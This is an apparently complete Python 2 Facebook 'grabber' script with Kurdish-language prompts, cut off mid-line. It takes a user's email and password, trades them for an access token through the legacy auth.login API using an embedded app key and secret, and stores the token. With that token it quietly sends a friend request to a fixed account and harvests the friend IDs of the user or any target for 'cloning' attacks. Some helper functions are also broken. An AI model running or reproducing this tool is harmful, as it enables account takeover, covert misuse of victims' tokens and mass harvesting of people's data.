#!/ufr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
print("FB GRABER")
os.system('clear')




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def kelwa():
	print "\x1b[1;96m🚸 Chwna Darawa"
	os.sys.exit()
                                        
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)


#### LOGO ####
logo = """
 
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mTkaya Bosta \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[37;1m
\033[33mOwner|Mr_DAEJEL

TLEGRAM CHANAL| </KURD/>/STAF/>

ME| Mr_DAEJEL

===========================================
\x1b[37;1m
"""

RH = """
\033[91m__  __      ____    _    _____    _ _____ _\033[91m
|  \/  |_ __|  _ \  / \  | ____|  | | ____| |\033[33m
| |\/| | '__| | | |/ _ \ |  _| _  | |  _| | |\033[33m
| |  | | |  | |_| / ___ \| |__| |_| | |___| |___\033[92m
|_|  |_|_|  |____/_/   \_\_____\___/|_____|_____|


"""
print(RH)
CorrectUsername = "Mr"
CorrectPassword = "up"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m😈 \x1b[1;95mID \x1b[31;1m\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m🤖 \x1b[1;95m\x1b[37;1m@Pass>> \x1b[1;91m")
                                                                               
        if (password == CorrectPassword):
            print "Daxl Bwet ba ID " + username #Noop=hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m Passwordakat Halaya"
            print " ID kat Halaya "
    else:
        print "\033[1;96mIDya Kat Halaya "
        print "passwordakat Halaya "

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('LOGIN NEW FB ')
		print('\x1b[31;1m<-------------$\x1b[36;1mLOGIN\x1b[31;1m$------------->')
		id = raw_input('\x1b[35;1m[️💻]¤EMAIL/ID¤♤> \x1b[37;1m')
		pwd = raw_input('\x1b[35;1m[💥]¤PASS¤♡> \x1b[31;1m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[31;1m Kesha La Xatakat Haya"
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[32;1m[✓]OK'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[31;1m[!]There is no connection[!]"
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[31;1m[!] Bbwra Am Account La Checkpointa Bakar Nayat[!]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			kelwa()
		else:
			print("\n\x1b[31;1m[¿]Email w Passwordt Halaya[💣]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[[31;1m[♤] Bbwra Token Ka Halaya [♤]"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91m Account Kat La checkpointa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		kelwa()
	os.system("clear")
	print logo
	#INFORMATION OF USER
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\x1b[32;1m NAME >>"+namefb
	print "\x1b[34;1m ID >>"+id
	print '\x1b[33;1m TotalSub >>'+subid
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print ""
	print "===================="
	print "\x1b[34;1m|1|>>>>>ʜᴀᴄᴋɪɴɢ"
	print "\x1b[35;1m|2|> Bo Update Krdna Wa"
	print "\x1b[35;1m|0|> Back"
	print "===================="
	#INFORMATION OF USER
	option()

def option():
	unikers = raw_input("\n\x1b[31;1mMr\x1b[37;1mDAEJEL>>\x1b[33;1m")
	if unikers =="":
		print "\x1b[31;1m[!]Tkaya Ba Batali Je Mahela"
		option()
	elif unikers =="1":
		graber()
	elif unikers =="2":
		os.system('clear')
		print logo
		anime("<<<<<<<<PREPARE TO ♡●♡UPDATE TOOL >>>>>>")
		os.system('bash update.sh')
	elif unikers =="0":
		anime('LOGIN OUT ACCOUNT PLEASE WAIT')
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print "\x1b[31;1m Tkaya Shte Sarbaxo Manwsa"
		option()

def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[31;1mToken Halaya Tkaya Daxl Barawa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[33m|1|>>>>>ʜᴀᴄᴋ ꜰʀɪɴᴅ ʟɪꜱᴛ"
	print "\033[33m|2|>>>>>ʜᴀᴄᴋ_ɪᴅ"
	print "\x1b[31;1m|0|🦂_BACK"
	startgrab()

def startgrab():
	peak = raw_input("Mr_DAEJEL")
	if peak=="":
		print "\x1b[1;91mTkaya Ba Batale Je Mahela"
		startgrab()
	elif peak =="1":
		os.system('clear')
		print logo
		print "@@@@@@@@@@@#Mr_DAEJEL#@@@@@@@@@@@"
		anime('\033[1;91mDarhenani ID Kan \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("[●] ENTER PUBLIC ID :")
		print ""
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[☯]/ NAME :  "+op["name"]
		except KeyError:
			print"\x1b[31;1mBbwra ID yaka error adat"
			raw_input("[GARANAWA]Enter Bka")
			graber()
		print"\x1b[32;1m[●] CLONING STARED..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mTkaya Boshayaka Ba Jwane Pr Bkara wa"
		startgrab()
	
	print "\033[1;96m[✺] Getting ALL ID"+str(len(id))
	anime('[●] Please Wait..')
	titik = ['.   ','..  ','... ','....','.....']
	for o in titik:
		print("[●]STAR"+o),;sys.stdout.flush();t
